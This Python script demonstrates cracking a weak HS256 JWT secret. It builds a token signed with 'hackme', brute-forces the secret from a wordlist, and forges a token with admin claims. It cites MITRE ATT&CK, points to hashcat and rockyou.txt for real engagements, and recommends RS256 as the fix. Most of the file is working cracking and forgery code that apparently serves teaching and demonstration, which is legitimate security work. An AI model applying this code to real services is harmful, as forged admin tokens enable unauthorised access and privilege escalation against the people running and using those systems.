"""
attack_crack.py — JWT Secret Cracking (Weak HS256 Secret)
==========================================================
MITRE ATT&CK: T1110.002 — Brute Force: Password Cracking

HOW IT WORKS:
  When a server uses HS256 (symmetric HMAC), the SAME secret is used to
  both SIGN and VERIFY the token. If that secret is weak (e.g., "secret",
  "password"), an attacker can brute-force it offline:

    1. Capture any valid JWT (from login, traffic sniff, leaked log, etc.)
    2. Try candidate secrets: re-sign header.payload with each candidate
    3. If the resulting signature matches the token's signature → secret found
    4. Now forge ANY token with ANY claims using that secret

  This is exactly how tools like hashcat (-m 16500) and jwt_tool work.
  No server contact needed after step 1 — purely offline.

WHY RS256 IS SAFER:
  RS256 uses an asymmetric key pair. You cannot brute-force the private key
  from a captured token. HS256 with a weak secret is trivially crackable.

DEMO SETUP:
  We generate a HS256 token signed with a weak secret ("hackme") to simulate
  a misconfigured server. The script then cracks it using a wordlist.

Real-world tool reference: hashcat --hash-type 16500 token.txt wordlist.txt
"""

import base64
import hashlib
import hmac
import json

# ── Wordlist (use rockyou.txt in real pentests) ───────────────────────────────
WORDLIST = [
    "password", "123456", "secret", "admin", "jwt",
    "token", "letmein", "qwerty", "abc123", "monkey",
    "hackme",          # ← the actual weak secret used below
    "supersecret", "changeme", "welcome", "iloveyou",
]

# ── The "captured" weak token (HS256, secret = "hackme") ─────────────────────
WEAK_SECRET = "hackme"   # simulates what the misconfigured server uses


def _b64url(data: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=").decode()
    )


def make_weak_token(secret: str) -> str:
    """Generate a HS256 token signed with the given secret."""
    h = _b64url({"alg": "HS256", "typ": "JWT"})
    p = _b64url({"user": "alice", "role": "user"})
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{sig_b64}"


def crack(token: str) -> str | None:
    """Try each candidate secret against the token. Return the secret if found."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header_b64, payload_b64, original_sig = parts
    signing_input = f"{header_b64}.{payload_b64}".encode()

    for candidate in WORDLIST:
        trial_sig = hmac.new(
            candidate.encode(), signing_input, hashlib.sha256
        ).digest()
        trial_b64 = base64.urlsafe_b64encode(trial_sig).rstrip(b"=").decode()
        if hmac.compare_digest(trial_b64, original_sig):
            return candidate
    return None


def forge_with_secret(secret: str) -> str:
    """Once we know the secret, forge admin claims."""
    h = _b64url({"alg": "HS256", "typ": "JWT"})
    p = _b64url({"user": "attacker", "role": "admin"})
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{sig_b64}"


def banner():
    print("=" * 65)
    print("  JWT SECRET CRACK — HS256 Weak Secret Brute-Force")
    print("  MITRE ATT&CK: T1110.002 — Password Cracking")
    print(f"  Wordlist size: {len(WORDLIST)} candidates")
    print("=" * 65)


def run():
    banner()

    # Step 1 — simulate capturing a HS256 token from the victim server
    captured = make_weak_token(WEAK_SECRET)
    print(f"\n[1] Captured HS256 token (from traffic / login response):")
    print(f"    {captured[:80]}...")

    # Step 2 — offline brute-force
    print(f"\n[2] Brute-forcing secret against {len(WORDLIST)} candidates...")
    found = crack(captured)

    if found:
        print(f"\n  [CRACKED]  Secret = \"{found}\"")
        print()

        # Step 3 — forge admin token with the cracked secret
        forged = forge_with_secret(found)
        print(f"[3] Forged admin token using cracked secret:")
        print(f"    {forged[:80]}...")
        print()
        print("  NOTE: This forged token would be accepted by any server")
        print("  still using HS256 with this weak secret.")
        print()
        print("  FIX: Use RS256 (asymmetric). An RSA private key cannot be")
        print("  brute-forced from a captured token. algorithms=['RS256']")
    else:
        print("\n  [NOT FOUND]  Secret not in wordlist.")
        print("  (Use hashcat -m 16500 with rockyou.txt for real engagements)")
    print()


if __name__ == "__main__":
    run()
